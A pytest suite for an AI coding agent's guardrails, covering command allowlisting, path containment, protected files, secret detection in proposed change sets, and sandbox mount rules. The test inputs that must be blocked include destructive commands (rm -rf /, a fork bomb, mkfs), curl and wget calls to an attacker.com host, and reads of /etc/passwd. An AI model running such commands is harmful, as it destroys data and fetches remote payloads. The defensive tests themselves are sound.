"""Comprehensive security tests for Step 7.4: Tool Execution Guardrails and ChangeSet Validation.

Covers all 18 required scenarios:
1. Approved command is allowed.
2. Unapproved command is blocked.
3. Destructive command is blocked.
4. Path traversal using `../` is blocked.
5. Absolute path outside workspace is blocked.
6. Symlink escape is blocked where supported by the platform.
7. Write to `.env` is blocked.
8. Write to `.github/workflows/` is blocked.
9. Valid ChangeSet passes validation.
10. Malformed ChangeSet is rejected.
11. Oversized file or diff is rejected.
12. Too many changed files is rejected.
13. Secret in a proposed ChangeSet is detected and blocked.
14. Secret values never appear in logs or error messages.
15. A blocked tool is never actually executed.
16. A blocked ChangeSet is never applied.
17. Blocking violations result in BLOCKED status and a checkpoint.
18. A blocked run cannot reach PR creation.
"""

from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from crewai.tools.base_tool import BaseTool
from repoagent.changeset_applier import apply_changeset_to_workspace
from repoagent.flow import RepoAgentFlow
from repoagent.monitoring import instrument_crewai_tool
from repoagent.pr_agent import open_and_verify_pull_request
from repoagent.schemas import ChangeSet, FileChange, RunState, RunStatus
from repoagent.security import (
    GuardrailViolation,
    is_protected_path,
    validate_changeset,
    validate_command_allowlist,
    validate_path_containment,
    validate_sandbox_mount_policy,
)


@pytest.fixture
def clean_workspace(tmp_path: Path) -> Path:
    """Create an isolated, git-initialized workspace for safety tests."""
    ws = tmp_path / "workspace"
    ws.mkdir()
    (ws / "src").mkdir()
    sample_file = ws / "src" / "sample.py"
    sample_file.write_text("def sample():\n    return 42\n", encoding="utf-8")

    ws_str = str(ws)
    subprocess.run(["git", "init"], cwd=ws_str, check=True, capture_output=True)
    subprocess.run(
        ["git", "config", "user.name", "Tester"], cwd=ws_str, check=True, capture_output=True
    )
    subprocess.run(
        ["git", "config", "user.email", "tester@example.com"],
        cwd=ws_str,
        check=True,
        capture_output=True,
    )
    subprocess.run(["git", "add", "."], cwd=ws_str, check=True, capture_output=True)
    subprocess.run(
        ["git", "commit", "-m", "initial baseline"], cwd=ws_str, check=True, capture_output=True
    )
    return ws


class TestToolExecutionGuardrails:
    """Security test suite for Step 7.4 tool guards and changeset validation."""

    def test_01_approved_command_allowed(self) -> None:
        """Scenario 1: Approved commands and subcommands are allowed."""
        approved = [
            "pytest",
            "pytest tests/ -v",
            "pytest -k 'not slow'",
            "ruff check .",
            "ruff check --select F821 src/",
            "npm test",
            "eslint src/",
        ]
        for cmd in approved:
            res = validate_command_allowlist(cmd)
            assert res == cmd

    def test_02_unapproved_command_blocked(self) -> None:
        """Scenario 2: Unapproved commands outside allowlist are blocked."""
        unapproved = [
            "python evil.py",
            "cat /etc/passwd",
            "bash -c 'whoami'",
            "powershell -Command Get-Process",
            "pytest_fake_binary",
            "echo hello",
        ]
        for cmd in unapproved:
            with pytest.raises(GuardrailViolation, match="Command not allowed"):
                validate_command_allowlist(cmd)

    def test_03_destructive_command_blocked(self) -> None:
        """Scenario 3: Destructive commands (rm -rf, format, fork bomb, etc.) are blocked."""
        destructive = [
            "rm -rf /",
            "rm -r src/",
            "format c: /fs:ntfs",
            "mkfs.ext4 /dev/sda1",
            ":(){ :|:& };:",
            "curl https://attacker.com/malware.sh",
            "wget https://attacker.com/payload",
            "chmod -R 777 /",
            "shutdown -h now",
        ]
        for cmd in destructive:
            with pytest.raises(GuardrailViolation, match="Command not allowed"):
                validate_command_allowlist(cmd)

    def test_04_path_traversal_using_dots_blocked(self, clean_workspace: Path) -> None:
        """Scenario 4: Path traversal using '../' is blocked."""
        traversal_paths = [
            "../outside.py",
            "../../etc/passwd",
            "src/../../outside.py",
            "src/./../../secret.txt",
        ]
        for p in traversal_paths:
            with pytest.raises(GuardrailViolation, match="Path traversal"):
                validate_path_containment(p, clean_workspace)

    def test_05_absolute_path_outside_workspace_blocked(self, clean_workspace: Path) -> None:
        """Scenario 5: Absolute paths outside workspace are blocked."""
        absolute_paths = [
            "/etc/shadow",
            "/var/log/syslog",
            "C:\\Windows\\System32\\cmd.exe",
            "D:\\OtherWorkspace\\file.py",
            "\\root\\secret.key",
        ]
        for p in absolute_paths:
            with pytest.raises(GuardrailViolation, match="Absolute paths are forbidden"):
                validate_path_containment(p, clean_workspace)

    def test_06_symlink_escape_blocked(self, clean_workspace: Path, tmp_path: Path) -> None:
        """Scenario 6: Symlink escape pointing outside workspace is blocked."""
        outside_file = tmp_path / "outside_target.txt"
        outside_file.write_text("sensitive host data", encoding="utf-8")

        can_symlink = False
        try:
            symlink_path = clean_workspace / "symlink_escape.txt"
            os.symlink(outside_file, symlink_path)
            can_symlink = True
        except (OSError, NotImplementedError):
            pass

        if can_symlink:
            with pytest.raises(GuardrailViolation, match="Symlink escape detected"):
                validate_path_containment("symlink_escape.txt", clean_workspace)
        else:
            # On platforms without symlink privileges, test realpath escape resolution
            def mock_realpath(p, *args, **kwargs):
                return str(outside_file) if "symlink_mock" in str(p) else str(p)

            err_pattern = "(Symlink escape detected|Path traversal detected)"
            with (
                patch("os.path.realpath", side_effect=mock_realpath),
                pytest.raises(GuardrailViolation, match=err_pattern),
            ):
                validate_path_containment("symlink_mock.txt", clean_workspace)

    def test_07_write_to_env_blocked(self) -> None:
        """Scenario 7: Writes to .env and environment secret files are blocked."""
        env_paths = [
            ".env",
            ".env.local",
            ".env.production",
            ".env.test",
            "config/production.env",
            ".ENV",
        ]
        for p in env_paths:
            is_prot, reason = is_protected_path(p)
            assert is_prot is True
            assert "protected" in str(reason).lower()

    def test_08_write_to_github_workflows_blocked(self) -> None:
        """Scenario 8: Writes to .github/workflows/ and git metadata are blocked."""
        protected_workflow_paths = [
            ".github/workflows/ci.yml",
            ".github/workflows/deploy.yaml",
            ".git/config",
            ".git/hooks/pre-commit",
        ]
        for p in protected_workflow_paths:
            is_prot, reason = is_protected_path(p)
            assert is_prot is True
            assert "protected" in str(reason).lower()

    def test_09_valid_changeset_passes_validation(self, clean_workspace: Path) -> None:
        """Scenario 9: Legitimate, well-structured ChangeSet passes validation."""
        cs = ChangeSet(
            files=[
                FileChange(
                    path="src/sample.py",
                    action="modify",
                    diff="@@ -1,2 +1,3 @@\n def sample():\n+    print('ok')\n     return 42\n",
                ),
                FileChange(
                    path="src/utils.py",
                    action="create",
                    diff="def helper() -> bool:\n    return True\n",
                ),
            ],
            summary="Add logging and helper function",
        )
        # Should execute cleanly without exception
        validate_changeset(cs, clean_workspace)

    def test_10_malformed_changeset_rejected(self, clean_workspace: Path) -> None:
        """Scenario 10: Malformed ChangeSets (invalid action, bad types) are rejected."""
        # Unsupported action
        cs_bad_action = ChangeSet(
            files=[FileChange(path="src/sample.py", action="chmod", diff="some diff")],
            summary="Invalid action",
        )
        with pytest.raises(GuardrailViolation, match="Unsupported operation"):
            validate_changeset(cs_bad_action, clean_workspace)

        # Non-changeset object
        with pytest.raises(GuardrailViolation, match="Expected ChangeSet instance"):
            validate_changeset(["not", "a", "changeset"], clean_workspace)

    def test_11_oversized_file_or_diff_rejected(self, clean_workspace: Path) -> None:
        """Scenario 11: Oversized file diff exceeding limit is rejected."""
        oversized_diff = "A" * 600_000  # Exceeds default MAX_FILE_SIZE_BYTES (500 KB)
        cs = ChangeSet(
            files=[FileChange(path="src/big.py", action="create", diff=oversized_diff)],
            summary="Oversized file",
        )
        with pytest.raises(GuardrailViolation, match="exceeds maximum single file limit"):
            validate_changeset(cs, clean_workspace)

    def test_12_too_many_changed_files_rejected(self, clean_workspace: Path) -> None:
        """Scenario 12: ChangeSet with too many changed files is rejected."""
        many_files = [
            FileChange(path=f"src/file_{i}.py", action="create", diff="x = 1\n")
            for i in range(30)  # Exceeds default MAX_FILES_CHANGED (25)
        ]
        cs = ChangeSet(files=many_files, summary="Massive file changes")
        with pytest.raises(GuardrailViolation, match="exceeds maximum file limit"):
            validate_changeset(cs, clean_workspace)

    def test_13_secret_in_proposed_changeset_detected_and_blocked(
        self, clean_workspace: Path, tmp_path: Path
    ) -> None:
        """Scenario 13: Secrets embedded in proposed diffs are detected and blocked."""
        secret_token = "ghp_" + ("x" * 36)
        cs = ChangeSet(
            files=[
                FileChange(
                    path="src/auth.py",
                    action="create",
                    diff=f'GITHUB_API_TOKEN = "{secret_token}"\n',
                )
            ],
            summary="Hardcoded GitHub token",
        )
        with (
            patch("repoagent.monitoring.event_logger.get_runs_dir", return_value=tmp_path),
            pytest.raises(GuardrailViolation, match="Secret detected in proposed change"),
        ):
            validate_changeset(cs, clean_workspace, run_id="sec_scan_run_013")

    def test_14_secret_values_never_appear_in_logs_or_errors(
        self, clean_workspace: Path, tmp_path: Path
    ) -> None:
        """Scenario 14: Secret values never appear in exception messages or event logs."""
        secret_key = "sk-" + ("y" * 32)
        cs = ChangeSet(
            files=[
                FileChange(
                    path="src/client.py",
                    action="create",
                    diff=f'OPENAI_API_KEY = "{secret_key}"\n',
                )
            ],
            summary="Hardcoded OpenAI API key",
        )
        run_id = "test_secret_redact_014"
        with patch("repoagent.monitoring.event_logger.get_runs_dir", return_value=tmp_path):
            try:
                validate_changeset(cs, clean_workspace, run_id=run_id)
            except GuardrailViolation as gv:
                # 1. Exception string must NOT contain secret value
                assert secret_key not in str(gv)
                assert secret_key not in gv.reason

            # 2. Event log must NOT contain secret value
            log_file = tmp_path / run_id / "events.jsonl"
            assert log_file.is_file()
            log_content = log_file.read_text(encoding="utf-8")
            assert secret_key not in log_content
            assert "OPENAI_KEY" in log_content

    def test_15_blocked_tool_never_actually_executed(self, tmp_path: Path) -> None:
        """Scenario 15: Blocked tool invocation halts immediately without calling original _run."""
        mock_run = MagicMock(return_value="executed successfully")

        class DangerousCommandTool(BaseTool):
            name: str = "run_command"
            description: str = "Runs a shell command."

            def _run(self, command: str) -> str:
                return mock_run(command)

        tool = DangerousCommandTool()
        with patch("repoagent.monitoring.event_logger.get_runs_dir", return_value=tmp_path):
            instrumented = instrument_crewai_tool(tool, run_id="sec_tool_run_015")

            with pytest.raises(GuardrailViolation, match="Command not allowed"):
                instrumented._run(command="rm -rf /")

            # Crucial assertion: original tool implementation was NEVER called
            mock_run.assert_not_called()

    def test_16_blocked_changeset_never_applied(
        self, clean_workspace: Path, tmp_path: Path
    ) -> None:
        """Scenario 16: Blocked ChangeSet is rejected before any files on disk are touched."""
        sample_path = clean_workspace / "src" / "sample.py"
        original_content = sample_path.read_text(encoding="utf-8")

        secret_token = "AIzaSy" + ("A" * 33)
        malicious_cs = ChangeSet(
            files=[
                FileChange(
                    path="src/sample.py",
                    action="modify",
                    diff=f'API_KEY = "{secret_token}"\n',
                ),
                FileChange(
                    path=".env",
                    action="create",
                    diff="SECRET=123\n",
                ),
            ],
            summary="Malicious changeset with secret and .env write",
        )

        with (
            patch("repoagent.monitoring.event_logger.get_runs_dir", return_value=tmp_path),
            pytest.raises(GuardrailViolation),
        ):
            apply_changeset_to_workspace(malicious_cs, clean_workspace, run_id="sec_cs_run_016")

        # Workspace remains untouched
        assert sample_path.read_text(encoding="utf-8") == original_content
        assert not (clean_workspace / ".env").exists()

    def test_17_blocking_violations_result_in_blocked_and_checkpoint(
        self, clean_workspace: Path, tmp_path: Path
    ) -> None:
        """Scenario 17: Blocking violation sets BLOCKED status and saves checkpoint."""
        run_id = "test_blocked_flow_017"
        state = RunState(
            run_id=run_id,
            requirement="Add secret keys to repository",
            status=RunStatus.RUNNING,
        )

        secret_val = "ghp_" + ("k" * 36)
        malicious_cs = ChangeSet(
            files=[
                FileChange(
                    path="src/tokens.py",
                    action="create",
                    diff=f'TOKEN = "{secret_val}"\n',
                )
            ],
            summary="Inject secret token",
        )

        def mock_coding(st: RunState) -> ChangeSet:
            return malicious_cs

        with patch("repoagent.monitoring.event_logger.get_runs_dir", return_value=tmp_path):
            flow = RepoAgentFlow(
                initial_state=state,
                workspace=clean_workspace,
                coding_fn=mock_coding,
            )
            # Run code stage which applies the changeset
            res = flow.code()

            assert res == "needs_human"
            assert flow.state.status == RunStatus.BLOCKED
            assert flow.state.finished_at is not None
            assert any("Security guardrail violation" in e for e in flow.state.errors)

            # Checkpoint file must exist
            checkpoint_file = clean_workspace.parent / "run_state.json"
            assert checkpoint_file.is_file()
            cp_data = json.loads(checkpoint_file.read_text(encoding="utf-8"))
            assert cp_data["status"] == RunStatus.BLOCKED.value

            # Subsequent stages must refuse execution
            assert flow.test() == "needs_human"

    def test_18_blocked_run_cannot_reach_pr_creation(
        self, clean_workspace: Path, tmp_path: Path
    ) -> None:
        """Scenario 18: A BLOCKED run is rejected by PR promotion with zero API calls."""
        run_id = "test_blocked_pr_018"
        state = RunState(
            run_id=run_id,
            requirement="Blocked feature",
            status=RunStatus.BLOCKED,
            errors=["Security violation: Secret detected in proposed change"],
        )

        with (
            patch("repoagent.monitoring.event_logger.get_runs_dir", return_value=tmp_path),
            pytest.raises(ValueError, match="Cannot open PR"),
        ):
            open_and_verify_pull_request(
                state=state,
                workspace=clean_workspace,
            )

    # -----------------------------------------------------------------------
    # Step 7.4 Remediation Tests (Findings 1, 2, and 3)
    # -----------------------------------------------------------------------

    def test_19_crewai_callback_in_workspace_accepted(
        self, clean_workspace: Path, tmp_path: Path
    ) -> None:
        """Finding 1: In-workspace filesystem operations pass tool guardrails."""

        class MockReadTool(BaseTool):
            name: str = "read_file"
            description: str = "Read file contents"

            def _run(self, path: str) -> str:
                return (clean_workspace / path).read_text(encoding="utf-8")

        tool = MockReadTool()
        instrumented = instrument_crewai_tool(
            tool,
            run_id="run_f1_in_ws",
            workspace=clean_workspace,
        )

        with patch("repoagent.monitoring.event_logger.get_runs_dir", return_value=tmp_path):
            result = instrumented.run(path="src/sample.py")
            assert "def sample():" in result

    def test_20_crewai_callback_path_traversal_blocked(
        self, clean_workspace: Path, tmp_path: Path
    ) -> None:
        """Finding 1: Path traversal via CrewAI tool wrapper is blocked."""

        class MockReadTool(BaseTool):
            name: str = "read_file"
            description: str = "Read file contents"

            def _run(self, path: str) -> str:
                return "executed"

        tool = MockReadTool()
        instrumented = instrument_crewai_tool(
            tool,
            run_id="run_f1_traversal",
            workspace=clean_workspace,
        )

        with (
            patch("repoagent.monitoring.event_logger.get_runs_dir", return_value=tmp_path),
            pytest.raises(GuardrailViolation) as exc_info,
        ):
            instrumented.run(path="../../etc/passwd")

        assert exc_info.value.category == "PATH_TRAVERSAL"

    def test_21_crewai_callback_absolute_path_blocked(
        self, clean_workspace: Path, tmp_path: Path
    ) -> None:
        """Finding 1: Absolute path outside workspace is blocked."""

        class MockReadTool(BaseTool):
            name: str = "read_file"
            description: str = "Read file contents"

            def _run(self, path: str) -> str:
                return "executed"

        tool = MockReadTool()
        instrumented = instrument_crewai_tool(
            tool,
            run_id="run_f1_abs",
            workspace=clean_workspace,
        )

        with (
            patch("repoagent.monitoring.event_logger.get_runs_dir", return_value=tmp_path),
            pytest.raises(GuardrailViolation) as exc_info,
        ):
            instrumented.run(path="C:/Windows/System32/drivers/etc/hosts")

        assert exc_info.value.category == "PATH_TRAVERSAL"

    def test_22_crewai_callback_missing_workspace_rejects_filesystem_tool(
        self, tmp_path: Path
    ) -> None:
        """Finding 1: Missing workspace context strictly rejects filesystem operations."""
        from repoagent.monitoring import set_current_workspace

        set_current_workspace(None)

        class MockWriteTool(BaseTool):
            name: str = "write_file"
            description: str = "Write file contents"

            def _run(self, path: str, content: str) -> str:
                return "written"

        tool = MockWriteTool()
        # No workspace argument and no workspace context registered
        instrumented = instrument_crewai_tool(
            tool,
            run_id="run_f1_no_ws",
            workspace=None,
        )

        with (
            patch("repoagent.monitoring.event_logger.get_runs_dir", return_value=tmp_path),
            pytest.raises(GuardrailViolation) as exc_info,
        ):
            instrumented.run(path="src/sample.py", content="new")

        assert exc_info.value.category == "WORKSPACE_REQUIRED"

    def test_23_npm_test_sandbox_policy_enforced(self, clean_workspace: Path) -> None:
        """Finding 2: Sandbox mount policy allows valid workspace mount with network_mode=none."""
        volumes = {str(clean_workspace): {"bind": "/workspace", "mode": "rw"}}
        # Must not raise
        validate_sandbox_mount_policy(
            workspace=clean_workspace,
            volumes=volumes,
            network_mode="none",
        )

    def test_24_npm_test_untrusted_script_cannot_access_host_credentials(
        self, clean_workspace: Path
    ) -> None:
        """Finding 2: Untrusted scripts cannot mount host credentials or docker sockets."""
        forbidden_mounts = [
            {"C:/Users/Developer/.ssh": {"bind": "/root/.ssh", "mode": "ro"}},
            {"/home/user/.aws": {"bind": "/root/.aws", "mode": "ro"}},
            {"/var/run/docker.sock": {"bind": "/var/run/docker.sock", "mode": "rw"}},
            {str(clean_workspace / ".env"): {"bind": "/workspace/.env", "mode": "ro"}},
        ]

        for bad_vol in forbidden_mounts:
            volumes = {str(clean_workspace): {"bind": "/workspace", "mode": "rw"}, **bad_vol}
            with pytest.raises(GuardrailViolation) as exc_info:
                validate_sandbox_mount_policy(
                    workspace=clean_workspace,
                    volumes=volumes,
                    network_mode="none",
                )
            assert exc_info.value.category == "SANDBOX_POLICY"

    def test_25_sandbox_network_must_be_none(self, clean_workspace: Path) -> None:
        """Finding 2: Sandbox execution strictly rejects enabled networking."""
        volumes = {str(clean_workspace): {"bind": "/workspace", "mode": "rw"}}
        for bad_net in ("bridge", "host", "default"):
            with pytest.raises(GuardrailViolation) as exc_info:
                validate_sandbox_mount_policy(
                    workspace=clean_workspace,
                    volumes=volumes,
                    network_mode=bad_net,
                )
            assert exc_info.value.category == "SANDBOX_POLICY"

    def test_26_changeset_atomic_write_renders_and_detects_secret(
        self, clean_workspace: Path, tmp_path: Path
    ) -> None:
        """Finding 3: Secret rendered into file content is caught at write time."""
        secret_token = "ghp_" + ("s" * 36)
        orig_content = (clean_workspace / "src" / "sample.py").read_text(encoding="utf-8")

        diff = (
            "--- a/src/sample.py\n"
            "+++ b/src/sample.py\n"
            "@@ -1,2 +1,3 @@\n"
            " def sample():\n"
            f'+    token = "{secret_token}"\n'
            "     return 42\n"
        )
        cs = ChangeSet(
            files=[FileChange(path="src/sample.py", action="modify", diff=diff)],
            summary="Inject secret via diff",
        )

        with (
            patch("repoagent.monitoring.event_logger.get_runs_dir", return_value=tmp_path),
            pytest.raises(GuardrailViolation) as exc_info,
        ):
            apply_changeset_to_workspace(cs, clean_workspace, run_id="run_f3_sec")

        assert exc_info.value.category in ("SECRET_LEAK", "SECRET_EXPOSURE")
        # Confirm file on disk is unchanged
        assert (clean_workspace / "src" / "sample.py").read_text(encoding="utf-8") == orig_content

    def test_27_changeset_symlink_replacement_rejected(
        self, clean_workspace: Path, tmp_path: Path
    ) -> None:
        """Finding 3: Changeset applier rejects write when target or parent is a symlink."""
        with patch("os.path.islink", return_value=True):
            diff = (
                "--- a/src/sample.py\n"
                "+++ b/src/sample.py\n"
                "@@ -1,2 +1,2 @@\n"
                " def sample():\n"
                "-    return 42\n"
                "+    return 43\n"
            )
            cs = ChangeSet(
                files=[FileChange(path="src/sample.py", action="modify", diff=diff)],
                summary="Symlink write attempt",
            )
            with (
                patch("repoagent.monitoring.event_logger.get_runs_dir", return_value=tmp_path),
                pytest.raises(GuardrailViolation) as exc_info,
            ):
                apply_changeset_to_workspace(cs, clean_workspace, run_id="run_f3_sym")

            assert exc_info.value.category == "SYMLINK_ESCAPE"

    def test_28_changeset_multifile_atomic_rollback_on_failure(
        self, clean_workspace: Path, tmp_path: Path
    ) -> None:
        """Finding 3: Atomic rollback restores files and cleans up creates on failure."""
        orig_content = (clean_workspace / "src" / "sample.py").read_text(encoding="utf-8")

        diff_valid = (
            "--- a/src/sample.py\n"
            "+++ b/src/sample.py\n"
            "@@ -1,2 +1,4 @@\n"
            " def sample():\n"
            "     return 42\n"
            "+\n"
            "+def extra():\n"
            "+    return 99\n"
        )
        # File 2 creates a file with a secret
        secret_token = "ghp_" + ("m" * 36)
        cs = ChangeSet(
            files=[
                FileChange(path="src/sample.py", action="modify", diff=diff_valid),
                FileChange(
                    path="src/bad.py",
                    action="create",
                    diff=f'API_KEY = "{secret_token}"\n',
                ),
            ],
            summary="Multi-file change with partial failure",
        )

        with (
            patch("repoagent.monitoring.event_logger.get_runs_dir", return_value=tmp_path),
            pytest.raises(GuardrailViolation),
        ):
            apply_changeset_to_workspace(cs, clean_workspace, run_id="run_f3_rollback")

        # Verify atomic rollback: sample.py must be unchanged, bad.py must not exist
        assert (clean_workspace / "src" / "sample.py").read_text(encoding="utf-8") == orig_content
        assert not (clean_workspace / "src" / "bad.py").exists()

    def test_29_protected_path_check_on_write(self, clean_workspace: Path, tmp_path: Path) -> None:
        """Finding 3: Protected paths (.env, .github/workflows, .git) cannot be written."""
        protected_targets = [
            (".env", "create", "VAR=val\n"),
            (".github/workflows/ci.yml", "create", "name: CI\n"),
            (".git/config", "modify", "diff"),
        ]

        git_config_path = clean_workspace / ".git" / "config"
        orig_git_config = (
            git_config_path.read_text(encoding="utf-8") if git_config_path.exists() else None
        )

        for path, action, diff in protected_targets:
            cs = ChangeSet(
                files=[FileChange(path=path, action=action, diff=diff)],
                summary=f"Attempt to write to {path}",
            )
            with (
                patch("repoagent.monitoring.event_logger.get_runs_dir", return_value=tmp_path),
                pytest.raises(GuardrailViolation) as exc_info,
            ):
                apply_changeset_to_workspace(cs, clean_workspace, run_id="run_f3_prot")

            assert exc_info.value.category in ("PROTECTED_PATH", "PATH_TRAVERSAL")
            if path == ".git/config":
                assert git_config_path.read_text(encoding="utf-8") == orig_git_config
            else:
                assert not (clean_workspace / path).is_file()
